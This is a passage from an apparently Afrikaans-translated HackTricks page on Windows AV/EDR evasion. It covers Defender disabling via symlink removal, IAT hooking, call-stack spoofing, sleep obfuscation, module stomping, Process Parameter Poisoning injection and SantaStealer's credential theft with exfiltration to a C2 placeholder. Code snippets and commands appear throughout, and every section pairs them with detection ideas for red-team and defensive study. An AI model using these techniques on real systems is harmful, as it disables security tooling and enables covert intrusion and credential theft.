wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` waar te neem, asook die dienskonfigurasie/-register wat daardie ligging weerspieël.

Post-exploitation-opsies
- DLL sideloading/code execution: Plaas/vervang DLL's wat Defender vanaf sy toepassingsgids laai om kode in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Diensbeëindiging/denial: Verwyder die weergawe-symlink sodat die gekonfigureerde pad by die volgende begin nie resolve nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Let daarop dat hierdie tegniek nie op sy eie privilege escalation verskaf nie; dit vereis admin-regte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime-evasion uit die C2 implant en na die teikenmodule self verskuif deur sy Import Address Table (IAT) te hook en geselekteerde APIs deur aanvaller-beheerde, position-independent code (PIC) te stuur. Dit veralgemeen evasion verder as die klein API-oppervlak wat baie kits beskikbaar stel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post-exploitation DLLs.

Hoëvlakbenadering
- Stage ’n PIC blob langs die teikenmodule met behulp van ’n reflective loader (voorafgeplaas of companion). Die PIC moet selfstandig en position-independent wees.
- Wanneer die host DLL laai, loop deur sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT-inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) sodat dit na dun PIC wrappers wys.
- Elke PIC wrapper voer evasions uit voordat dit die werklike API-adres met ’n tail-call aanroep. Tipiese evasions sluit in:
- Memory mask/unmask rondom die call (bv. encrypt beacon-streke, RWX→RX, verander bladsyname/-permissions) en herstel dit ná die call.
- Call-stack spoofing: konstrueer ’n onskadelike stack en transition na die teiken-API sodat call-stack-analise na verwagte frames resolve.
- Vir compatibility, export ’n interface sodat ’n Aggressor script (of ekwivalent) kan registreer watter APIs vir Beacon, BOFs en post-ex DLLs gehook moet word.

Waarom IAT hooking hier
- Werk vir enige code wat die gehookte import gebruik, sonder om tool-code te wysig of op Beacon staat te maak om spesifieke APIs te proxy.
- Dek post-ex DLLs: hooking van LoadLibrary* laat jou toe om module loads te intercept (bv. System.Management.Automation.dll, clr.dll) en dieselfde masking/stack-evasion op hul API-calls toe te pas.
- Herstel betroubare gebruik van process-spawning post-ex commands teen call-stack-gebaseerde detections deur CreateProcessA/W te wrap.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Pas die patch toe ná relocations/ASLR en vóór die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking tydens DllMain van die gelaaide module.
- Hou wrappers klein en PIC-safe; resolve die ware API via die oorspronklike IAT-waarde wat jy vóór patching vasgelê het, of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en vermy om writable+executable pages agter te laat.

Call-stack spoofing stub
- Draugr-style PIC stubs bou ’n vals call chain (return addresses na benign modules) en pivot dan na die werklike API.
- Dit verslaan detections wat canonical stacks van Beacon/BOFs na sensitiewe APIs verwag.
- Kombineer dit met stack cutting/stack stitching techniques om binne verwagte frames te land voordat die API-prologue bereik word.

Operational integration
- Plaas die reflective loader vooraan in post-ex DLLs sodat die PIC en hooks outomaties initialiseer wanneer die DLL gelaai word.
- Gebruik ’n Aggressor script om target APIs te registreer sodat Beacon en BOFs deursigtig voordeel trek uit dieselfde evasion path sonder code changes.

Detection/DFIR considerations
- IAT-integriteit: entries wat na non-image (heap/anon) addresses resolve; periodieke verification van import pointers.
- Stack anomalies: return addresses wat nie aan loaded images behoort nie; skielike transitions na non-image PIC; inkonsekwente RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes na IAT, vroeë DllMain-aktiwiteit wat import thunks wysig, onverwagte RX-regions wat tydens load geskep word.
- Image-load evasion: indien hooking LoadLibrary* gebruik word, monitor verdagte loads van automation/clr assemblies wat met memory masking events korreleer.

Related building blocks and examples
- Reflective loaders wat IAT patching tydens load uitvoer (bv. TitanLdr, AceLdr)
- Memory masking hooks (bv. simplehook) en stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (bv. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Indien jy ’n reflective loader beheer, kan jy imports **tydens** `ProcessImports()` hook deur die loader se `GetProcAddress` pointer te vervang met ’n custom resolver wat eers hooks nagaan:

- Bou ’n **resident PICO** (persistent PIC object) wat voortbestaan nadat die transient loader PIC homself vrygestel het.
- Export ’n `setup_hooks()`-funksie wat die loader se import resolver oorskryf (bv. `funcs.GetProcAddress = _GetProcAddress`).
- Slaan in `_GetProcAddress` ordinal imports oor en gebruik ’n hash-based hook lookup soos `__resolve_hook(ror13hash(name))`. Indien ’n hook bestaan, return dit; anders delegate na die werklike `GetProcAddress`.
- Register hook targets tydens link time met Crystal Palace `addhook "MODULE$Func" "hook"` entries. Die hook bly geldig omdat dit binne die resident PICO leef.

Dit lewer **import-time IAT redirection** sonder om die gelaaide DLL se code section ná load te patch.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks trigger slegs indien die funksie werklik in die target se IAT is. Indien ’n module APIs via ’n PEB-walk + hash resolve (geen import entry nie), forceer ’n werklike import sodat die loader se `ProcessImports()`-path dit sien:

- Vervang hashed export resolution (bv. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) met ’n direkte reference soos `&WaitForSingleObject`.
- Die compiler emit ’n IAT-entry, wat interception moontlik maak wanneer die reflective loader imports resolve.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

In plaas daarvan om `Sleep` te patch, hook die **werklike wait/IPC-primitives** wat die implant gebruik (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Vir lang waits, wrap die call in ’n Ekko-style obfuscation chain wat die in-memory image tydens idle encrypt:

- Gebruik `CreateTimerQueueTimer` om ’n sequence callbacks te schedule wat `NtContinue` met crafted `CONTEXT` frames call.
- Tipiese chain (x64): stel image na `PAGE_READWRITE` → RC4-encrypt via `advapi32!SystemFunction032` oor die volledige mapped image → voer die blocking wait uit → RC4-decrypt → **restore per-section permissions** deur PE sections te deurloop → signal completion.
- `RtlCaptureContext` verskaf ’n template `CONTEXT`; clone dit in multiple frames en stel registers (`Rip/Rcx/Rdx/R8/R9`) om elke stap te invoke.

Operational detail: return “success” vir lang waits (bv. `WAIT_OBJECT_0`) sodat die caller voortgaan terwyl die image gemasker is. Hierdie patroon versteek die module vir scanners tydens idle windows en vermy die klassieke “patched `Sleep()`”-signature.

Detection ideas (telemetry-based)
- Bursts van `CreateTimerQueueTimer` callbacks wat na `NtContinue` wys.
- `advapi32!SystemFunction032` wat op groot contiguous image-sized buffers gebruik word.
- Groot-range `VirtualProtect`, gevolg deur custom per-section permission restoration.

### Runtime CFG registration for sleep-obfuscation gadgets

Op CFG-enabled targets sal die eerste indirect jump na ’n mid-function gadget soos `jmp [rbx]` of `jmp rdi` gewoonlik die process laat crash met `STATUS_STACK_BUFFER_OVERRUN`, omdat die gadget nie in die module se CFG metadata voorkom nie. Om Ekko/Kraken-style chains binne hardened processes aan die lewe te hou:

- Register elke indirect destination wat deur die chain gebruik word met `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` en `CFG_CALL_TARGET_VALID` entries.
- Vir addresses binne loaded images (`ntdll`, `kernel32`, `advapi32`) moet die `MEMORY_RANGE_ENTRY` by die **image base** begin en die **volledige image size** dek.
- Vir manually mapped/PIC/stomped regions, gebruik eerder die **allocation base** en allocation size.
- Mark nie net die dispatch gadget nie, maar ook exports wat indirek bereik word (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) en enige attacker-controlled executable sections wat indirect targets sal word.

Dit verander ROP/JOP-style sleep chains van “werk slegs in non-CFG processes” na ’n reusable primitive vir `explorer.exe`, browsers, `svchost.exe` en ander endpoints wat met `/guard:cf` gecompile is.

### CET-safe stack spoofing for sleeping threads

Volledige `CONTEXT` replacement is noisy en kan op CET Shadow Stack systems breek, omdat ’n spoofed `Rip` steeds met die hardware shadow stack moet ooreenstem. ’n Veiliger sleep-masking pattern is:

- Kies ’n ander thread in dieselfde process en lees sy `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Backup die huidige thread se werklike TEB/TIB.
- Capture die werklike sleeping context met `GetThreadContext`.
- Copy **slegs** die werklike `Rip` na die spoof context en laat die spoofed `Rsp`/stack state onveranderd.
- Copy gedurende die sleep window die spoof thread se `NT_TIB` na die huidige TEB sodat stack walkers binne ’n legitimate stack range unwind.
- Restore ná die wait die oorspronklike TIB en thread context.

Dit behou ’n CET-consistent instruction pointer terwyl dit EDR stack walkers mislei wat TEB stack metadata vertrou om unwinds te valideer.

### APC-based alternative: Kraken Mask

Indien timer-queue dispatch te signatured is, kan dieselfde sleep-encrypt-spoof-restore sequence vanuit ’n suspended helper thread met queued APCs uitgevoer word:

- Create ’n helper thread met `NtTestAlert` as entrypoint.
- Queue prepared `CONTEXT` frames/APCs met `NtQueueApcThread` en drain hulle met `NtAlertResumeThread`.
- Store die chain state op die heap in plaas van die helper stack om te voorkom dat die default 64 KB thread stack uitgeput word.
- Gebruik `NtSignalAndWaitForSingleObject` om die start event atomies te signal en te block.
- Suspend die main thread voordat die TIB/context herstel word (`NtSuspendThread` → restore → `NtResumeThread`) om die race window te verklein waarin ’n scanner ’n half-restored stack kan sien.

Dit vervang die `CreateTimerQueueTimer` + `NtContinue` signature met ’n helper-thread/APC signature, terwyl dieselfde RC4 masking- en stack-spoofing-doelwitte behou word.

Additional detection ideas
- `NtSetInformationVirtualMemory` met `VmCfgCallTargetInformation` kort voor sleeps, waits of APC dispatch.
- `GetThreadContext`/`SetThreadContext` wat rondom `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` of `ConnectNamedPipe` gewrap word.
- `NtQueryInformationThread`, gevolg deur direkte writes na die huidige thread se TEB/TIB stack bounds.
- `NtQueueApcThread`/`NtAlertResumeThread` chains wat indirek `SystemFunction032`, `VirtualProtect` of section-permission restoration helpers bereik.
- Herhaalde gebruik van kort gadget signatures soos `FF 23` (`jmp [rbx]`) of `FF E7` (`jmp rdi`) as dispatch pivots binne signed modules.


## Precision Module Stomping

Module stomping voer payloads uit die **`.text` section van ’n DLL wat reeds binne die target process gemapped is** in plaas daarvan om ooglopende private executable memory te allokeer of ’n vars sacrificial DLL te laai. Die overwrite target behoort ’n **loaded, disk-backed image** te wees waarvan die code space die payload kan absorbeer sonder om code paths te beskadig wat die process steeds benodig.

### Reliable target selection

Naïewe stomping teen algemene modules soos `uxtheme.dll` of `comctl32.dll` is fragiel: die DLL is moontlik nie in die remote process gelaai nie, en ’n te klein code region sal die process laat crash. ’n Meer betroubare workflow is:

1. Enumerate die target process se modules en behou ’n **names-only include list** van DLLs wat reeds gelaai is.
2. Build eers die payload en teken die **presiese byte size** aan.
3. Scan candidate DLLs op disk en vergelyk die PE section **`.text` `Misc_VirtualSize`** met die payload size. Dit is belangriker as die file size, omdat dit die grootte van die executable section weerspieël **wanneer dit in memory gemapped is**.
4. Parse die **Export Address Table (EAT)** en kies ’n exported function RVA as die stomp start offset.
5. Bereken die **blast radius**: indien die payload die geselekteerde function boundary oorskry, sal dit aangrensende exports overwrite wat daarna in memory gelê is.

Tipiese recon/selection helpers wat in die wild gesien word:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operasionele notas
- Verkies DLLs wat **reeds gelaai** is in die remote process om die telemetry van `LoadLibrary`/onverwagte image loads te vermy.
- Verkies exports wat selde deur die target application uitgevoer word; anders kan normale code paths die gestompte bytes voor of ná thread creation tref.
- Groot implants vereis dikwels dat shellcode embedding verander word van ’n string literal na ’n **byte-array/braced initializer**, sodat die volledige buffer korrek in die injector source verteenwoordig word.

Opsporingsidees
- Remote writes na **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) in plaas van die meer algemene private RWX/RX allocations.
- Export entry points waarvan die in-memory bytes nie meer met die backing file op disk ooreenstem nie.
- Remote threads of context pivots wat begin uitvoer binne ’n legitimate DLL export waarvan die eerste bytes onlangs gewysig is.
- Suspicious `VirtualProtect(Ex)` / `WriteProcessMemory`-sequences teen DLL `.text` pages, gevolg deur thread creation.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) is ’n **process-injection / EDR-evasion**-tegniek wat die klassieke remote write path (`VirtualAllocEx` + `WriteProcessMemory`) vermy. In plaas daarvan om bytes na ’n reeds lopende target te kopieer, misbruik dit die feit dat Windows **geselekteerde `CreateProcessW`-startup parameters na die child process kopieer** en dit binne `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) stoor.

### Poisonable carriers copied by `CreateProcessW`

Nuttige carriers is:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (met `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktiese carrier-beperkings:

- `lpCommandLine` moet na **writable memory** wys vir `CreateProcessW`, en is beperk tot **32,767 Unicode characters**, insluitend die null terminator.
- `lpEnvironment` moet ’n Unicode environment block wees van opeenvolgende `NAME=VALUE\0`-strings wat met ’n ekstra `\0` beëindig word.
- `lpReserved` is amptelik gereserveer, dus moet die `ShellInfo`-mapping as ’n implementation detail eerder as ’n stabiele gedokumenteerde contract behandel word.

Dit verander normale process creation in die **payload-transfer primitive**. Die operator skep die child process met attacker-controlled startup data en laat Windows die cross-process copy uitvoer.

### Remote lookup flow without remote write APIs

Nadat die child geskep is, resolve die gekopieerde buffer met **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → kry `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lees die remote `PEB`
3. Volg `PEB.ProcessParameters`
4. Lees `RTL_USER_PROCESS_PARAMETERS`
5. Gebruik die geselekteerde pointer:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Uitvoer van die gekopieerde parameterbuffer

Die gekopieerde parametergebied is gewoonlik `RW`, nie uitvoerbaar nie. ’n Algemene P3-chain is:

1. Skep die proses normaalweg (nie suspended nie)
2. Maak die gekose parameterbladsy uitvoerbaar met `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Hergebruik die main thread-handle wat reeds in `PROCESS_INFORMATION` teruggestuur is
4. Herlei uitvoering met `NtSetContextThread` (`CONTEXT_CONTROL`, oorskryf `RIP`)

Anders as klassieke thread hijacking-workflows, **vereis dit nie** `SuspendThread` / `ResumeThread` nie; die context kan direk op die teruggestuurde main thread-handle verander word.

Dit vermy verskeie APIs wat algemeen vir injection gemonitor word:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- dikwels ook `SuspendThread` / `ResumeThread`

### Null-byte-beperking en staged shellcode

Al drie carriers is **string- of string-agtige data**, dus word ’n raw payload wat `0x00` bevat tydens oordrag afgekap. ’n Praktiese workaround is ’n **null-free first stage** wat constants tydens runtime rekonstrueer en dan ’n arbitrêre second stage laai.

’n Eenvoudige patroon is XOR-gebaseerde constant synthesis:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Dit stel die eerste stage in staat om stack strings, API-argumente, DLL-paaie of 'n second-stage shellcode loader te bou sonder om null bytes in die vervoerde parameter in te sluit.

### Stack-gebaseerde API-oproepe vanaf die eerste stage

Wanneer die eerste stage API's soos `LoadLibraryA` moet aanroep, kan dit:

- die string/buffer op die teiken se stack push
- die **32-byte x64 shadow space** reserveer
- `RCX`, `RDX`, `R8`, `R9` op konstantes of `RSP`-relatiewe pointers stel
- `RSP` **16-byte aligned** hou voordat die oproep gemaak word

'n Second stage kan dan vanaf die stack na 'n `PAGE_READWRITE`-allokasie gekopieer word, met `VirtualProtect` na `PAGE_EXECUTE_READ` verander word, en daarheen gespring word, waardeur 'n direkte RWX-allokasie vermy word.

### Detection-idees

Goeie hunting-geleenthede wat deur die outeurs genoem word:

- `VirtualProtectEx` / `NtProtectVirtualMemory` wat **process-parameter pages executable** maak
- daardie protection change gevolg deur `SetThreadContext` / `NtSetContextThread`
- remote reads van `PEB` en daarna `RTL_USER_PROCESS_PARAMETERS`
- buitengewoon lang / hoë-entropy `lpCommandLine`-, `lpEnvironment`- of `STARTUPINFO.lpReserved`-waardes tydens process creation

### Notas

- P3 is 'n **cross-process transfer trick**, nie op sigself 'n volledige execution primitive nie: die gekopieerde parameter benodig steeds 'n execute-permission change en 'n execution redirection method.
- `RtlCreateProcessReflection` / Dirty Vanity is deur die outeurs oorweeg, maar verwerp omdat dit intern by verdagte primitives soos `NtWriteVirtualMemory` en `NtCreateThreadEx` uitkom.

## SantaStealer Tradecraft vir Fileless Evasion en Credential Theft

SantaStealer (ook bekend as BluelineStealer) illustreer hoe moderne info-stealers AV bypass, anti-analysis en credential access in 'n enkele workflow kombineer.

### Keyboard layout gating en sandbox delay

- 'n Config flag (`anti_cis`) enumereer geïnstalleerde keyboard layouts via `GetKeyboardLayoutList`. As 'n Cyrillic layout gevind word, skep die sample 'n leë `CIS`-marker en terminateer dit voordat stealers uitgevoer word, wat verseker dat dit nooit op uitgeslote locales detoneer nie, terwyl dit 'n hunting artifact agterlaat.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Gelaagde `check_antivm`-logika

- Variant A loop deur die proseslys, hash elke naam met ’n pasgemaakte rolling checksum, en vergelyk dit met ingebedde blocklists vir debuggers/sandboxes; dit herhaal die checksum oor die rekenaarnaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B ondersoek stelseleienskappe (minimum prosesgetal, onlangse uptime), roep `OpenServiceA("VBoxGuest")` aan om VirtualBox additions op te spoor, en voer timing checks rondom sleeps uit om single-stepping te identifiseer. Enige treffer staak die uitvoering voordat modules begin.

### Fileless helper + dubbele ChaCha20 reflective loading

- Die primêre DLL/EXE bevat ’n Chromium credential helper wat óf na skyf geskryf óf handmatig in memory gemap word; fileless mode los imports/relocations self op sodat geen helper artifacts geskryf word nie.
- Daardie helper stoor ’n second-stage DLL wat twee keer met ChaCha20 encrypted is (twee 32-byte keys + 12-byte nonces). Ná albei passes laai dit die blob reflectively (geen `LoadLibrary` nie) en roep exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` aan, afgelei van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Die ChromElevator-routines gebruik direct-syscall reflective process hollowing om in ’n aktiewe Chromium-browser te inject, AppBound Encryption keys te inherit, en passwords/cookies/credit cards direk uit SQLite-databasisse te decrypt ondanks ABE-hardening.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` loop deur ’n globale `memory_generators`-function-pointer-table en spawn een thread per enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, ens.). Elke thread skryf resultate na shared buffers en rapporteer sy file count ná ’n ~45s join window.
- Wanneer dit klaar is, word alles met die statically linked `miniz`-library as `%TEMP%\\Log.zip` gezip. `ThreadPayload1` sleep dan 15s en stream die archive in 10 MB-chunks via HTTP POST na `http://<C2>:6767/upload`, terwyl dit ’n browser se `multipart/form-data` boundary (`----WebKitFormBoundary***`) spoof. Elke chunk voeg `User-Agent: upload`, `auth: <build_id>`, opsioneel `w: <campaign_tag>`, by, en die laaste chunk voeg `complete: true` by sodat die C2 weet dat reassembly voltooi is.

## References

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
